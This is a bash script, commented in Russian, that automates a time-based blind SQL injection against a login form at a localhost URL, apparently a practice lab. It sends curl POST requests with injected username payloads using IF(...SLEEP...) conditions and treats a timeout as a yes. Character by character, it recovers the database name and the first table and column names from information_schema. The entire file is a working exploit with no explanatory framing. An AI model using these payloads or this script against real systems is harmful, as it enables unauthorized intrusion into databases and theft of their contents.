#!/bin/bash

URL="http://localhost/gareev/login.php"

echo "[+] Получаем имя базы данных..."

# Получаем длину имени базы данных
for i in {1..20}; do
  echo -n "."
  curl -s -X POST "$URL" \
	  -d "username=sojfasdfa' OR IF(LENGTH(DATABASE())=$i, SLEEP(1), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null
  ret="$?"
  echo -n "return code: $ret"
  if [ "$ret" == "28" ]; then
    len_db=$i
    break
  fi
done

echo -e "\n[+] Длина имени базы данных: $len_db"

# Получаем имя базы данных посимвольно
db_name=""
for ((i=1; i<=$len_db; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=fdsafadmin' OR IF(SUBSTRING(DATABASE(),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null 

  ret="$?"
  if [ "$ret" == "28" ]; then
  echo "return code: $ret"
      db_name+="$c"
      dots=$(( len_db - ${#db_name} ))
	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
      echo  "db_name = $db_name$dot_str"
      break
    fi
  done
done

echo -e "\n\n[+] Имя базы данных: $db_name"

# --------------------------------------------

echo -e "\n[+] Получаем имя первой таблицы..."

# Получаем длину имени первой таблицы
for i in {1..50}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=fdsafa' OR IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null


   ret="$?"
  if [ "$ret" == "28" ]; then
    len_tbl=$i
    break
  fi
done

echo -e "\n[+] Длина имени таблицы: $len_tbl"

# Получаем имя таблицы посимвольно
table_name=""
for ((i=1; i<=$len_tbl; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=adfafd' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null




  ret="$?"
  if [ "$ret" == "28" ]; then
#  echo "return code: $ret"
      table_name+="$c"
      dots=$(( len_tbl - ${#table_name} ))
	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
      echo  "table_name = $table_name$dot_str"


      break
    fi
  done
done

echo -e "\n\n[+] Имя таблицы: $table_name"

# --------------------------------------------

echo -e "\n[+] Получаем первый столбец таблицы..."

# Получаем длину имени первого столбца
for i in {1..50}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=fdsafas' OR IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null


   ret="$?"
#  echo -n "return code: $ret"
  if [ "$ret" == "28" ]; then

    len_col=$i
    break
  fi
done

echo -e "\n[+] Длина имени первого столбца: $len_col"

# Получаем имя столбца посимвольно
col_name=""
for ((i=1; i<=$len_col; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=fdsaf' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null

ret="$?"
  if [ "$ret" == "28" ]; then
      col_name+="$c"
      dots=$(( len_col - ${#col_name} ))
	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
      echo  "col_name = $col_name$dot_str"

    
      break
    fi
  done
done

echo -e "\n\n[+] Первый столбец таблицы: $col_name"
